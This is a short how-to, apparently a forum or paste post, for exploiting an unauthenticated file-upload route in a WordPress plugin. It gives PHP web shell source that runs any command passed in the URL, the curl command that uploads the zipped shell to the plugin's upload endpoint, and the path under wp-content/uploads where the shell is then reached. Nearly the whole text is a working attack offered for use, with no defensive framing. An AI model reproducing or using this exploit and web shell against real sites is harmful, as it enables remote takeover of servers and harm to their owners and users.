Summary:

because in the burp suite, the build request is complicated, I only use curl
1. Create file index.html and index.php

Index.html : 
<html>
Hello world
</html>

Index.php :
<?php
system($_GET[cmd]);
?>

2. Once created enter into .zip (COMPRESS)
3.  LETS UPLOAD
CURL :
curl site.com/index.php/wp-json/articulate/v1/upload-data -F "name={NAMAFILE}" -F "chunk={RANDOM}" -F "chunks={RANDOM}" -F "file=@YOURFILE.zip"
4. OK HERE, THERE IS A READING UPLOAD COMPLETE which means success
we try access to
site.com/PATH/ <PATH = PATH AT RESULT EX: site.com/wp-content/uploads/articulate_uploads/kntl17/index.php
